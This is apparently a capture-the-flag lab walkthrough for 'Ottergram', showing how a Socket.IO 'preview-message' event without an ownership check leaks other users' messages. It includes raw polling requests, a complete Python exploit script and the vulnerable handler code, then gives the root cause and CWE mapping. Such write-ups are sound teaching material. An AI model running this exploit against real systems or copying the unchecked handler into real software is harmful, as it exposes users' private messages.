# ottergram-006 - BugForge Lab Walkthrough

**URL:** https://lab-1784316488104-sjcxp2.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** IDOR over Socket.IO - the `preview-message` event has no ownership check
**Flag:** `bug{QVFQysd27NNC3J54nd8zb96lacpue4As}`

---

## Summary

Ottergram is a photo-sharing SPA with a direct messaging feature. The REST API correctly scopes messages to the authenticated caller, but a parallel real-time channel built on Socket.IO exposes a `preview-message` event that accepts a raw, caller-supplied message ID and returns its content with no check that the caller owns that message. Any authenticated user can request a preview of any message in the system, including messages seeded for other accounts.

---

## Tech Stack

- React SPA frontend (Create React App)
- Express.js (Node.js)
- Socket.IO for real-time messaging
- JWT (Bearer token from registration/login)

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT directly |
| `/api/messages/inbox` | GET | JWT | Correctly scoped to the caller |
| `preview-message` (Socket.IO event) | emit | JWT (socket auth packet) | **Vulnerable** - no ownership check |
| `message-preview` (Socket.IO event) | on | - | Server response, returns `{messageId, preview}` |

---

## Discovery

### Step 1 - Enumerate the app

Fetching the homepage and its JS bundle at `/static/js/main.c51a93b6.js` shows the usual Ottergram REST routes (`/api/register`, `/api/messages`, `/api/posts`, `/api/profile`, `/api/admin/*`) plus direct Socket.IO calls that are not visible from the REST surface alone:

```
grep -o "socket\.\(on\|emit\)([^)]*" bundle.js

socket.emit("preview-message", t.messageId
socket.on("message-preview", e...
```

Two things stand out: the client emits `preview-message` with a raw `messageId`, and listens for a `message-preview` response.

### Step 2 - Register and check the REST inbox

```
POST /api/register
{"username":"pentest_ryan","email":"pentest_ryan@example.com","password":"Password123!"}
```

Registration returns a usable JWT directly with no separate login step required. Checking the REST inbox for this fresh account:

```
GET /api/messages/inbox
Authorization: Bearer <token>

[]
```

Empty, and correctly scoped, no messages belong to this new account. This rules out the REST layer and narrows the target to the Socket.IO channel.

### Step 3 - Open and authenticate a Socket.IO session

Socket.IO's polling transport can be driven directly with plain HTTP requests, no WebSocket client needed.

```
GET /socket.io/?EIO=4&transport=polling&t=test1

0{"sid":"wccUVBOp4hJGOA5qAAAA","upgrades":["websocket"],...}
```

Authenticate the session by sending a CONNECT packet (`40`) containing the JWT:

```
POST /socket.io/?EIO=4&transport=polling&sid=wccUVBOp4hJGOA5qAAAA
Content-Type: text/plain;charset=UTF-8

40{"token":"<jwt>"}

ok
```

Polling confirms the connection was accepted:

```
GET /socket.io/?EIO=4&transport=polling&sid=wccUVBOp4hJGOA5qAAAA

40{"sid":"bRubGGeI0dMWqbxyAAAB"}
```

### Step 4 - Emit preview-message for an ID the account does not own

```
POST /socket.io/?EIO=4&transport=polling&sid=wccUVBOp4hJGOA5qAAAA
Content-Type: text/plain;charset=UTF-8

42["preview-message",1]

ok
```

Polling for the server's push frame:

```
GET /socket.io/?EIO=4&transport=polling&sid=wccUVBOp4hJGOA5qAAAA

42["message-preview",{"messageId":1,"preview":"bug{QVFQysd27NNC3J54nd8zb96lacpue4As} Hey! I loved your recent otter post! Where did you take that photo?"}]
```

Message ID 1, seeded for another account, is returned in full on the very first attempt. No brute forcing of IDs was needed.

---

## Exploit

```python
import urllib.request, json, re

TARGET = "https://lab-1784316488104-sjcxp2.labs-app.bugforge.io"

def post(path, body, tok=None, content_type="application/json"):
    h = {"Content-Type": content_type}
    if tok:
        h["Authorization"] = "Bearer " + tok
    data = json.dumps(body).encode() if content_type == "application/json" else body.encode()
    req = urllib.request.Request(TARGET + path, data=data, headers=h)
    return urllib.request.urlopen(req).read().decode()

reg = json.loads(post("/api/register", {"username": "pentest_ryan",
    "email": "pentest_ryan@example.com", "password": "Password123!"}))
token = reg["token"]

handshake = urllib.request.urlopen(TARGET + "/socket.io/?EIO=4&transport=polling&t=1").read().decode()
sid = json.loads(handshake[1:])["sid"]

post(f"/socket.io/?EIO=4&transport=polling&sid={sid}",
     '40{"token":"%s"}' % token, content_type="text/plain")
urllib.request.urlopen(TARGET + f"/socket.io/?EIO=4&transport=polling&sid={sid}").read()

post(f"/socket.io/?EIO=4&transport=polling&sid={sid}",
     '42["preview-message",1]', content_type="text/plain")
resp = urllib.request.urlopen(TARGET + f"/socket.io/?EIO=4&transport=polling&sid={sid}").read().decode()
print(re.search(r"bug\{[^}]+\}", resp).group())
# bug{QVFQysd27NNC3J54nd8zb96lacpue4As}
```

---

## Dead Ends

None encountered - the REST inbox endpoint was checked first and confirmed correctly scoped, which directly pointed at the Socket.IO channel as the remaining unauthenticated surface. The first message ID tried (1) returned the flag immediately.

---

## Root Cause

The REST route serving messages checks that the requested resource belongs to the authenticated caller. The Socket.IO handler for `preview-message` serves the same underlying data but was implemented separately and never received the same ownership check:

```javascript
// Vulnerable pattern (approximate)
socket.on("preview-message", async (messageId) => {
  const message = await db.get("SELECT * FROM messages WHERE id = ?", [messageId]);
  socket.emit("message-preview", { messageId, preview: message.content });
});
```

Authorization was added once, on the REST route, and never ported to the WebSocket handler that exposes the same data through a separate transport.

---

## CWE / OWASP

- **CWE-639**: Authorization Bypass Through User-Controlled Key (Insecure Direct Object Reference)
- **CWE-862**: Missing Authorization
- **OWASP A01:2021** - Broken Access Control
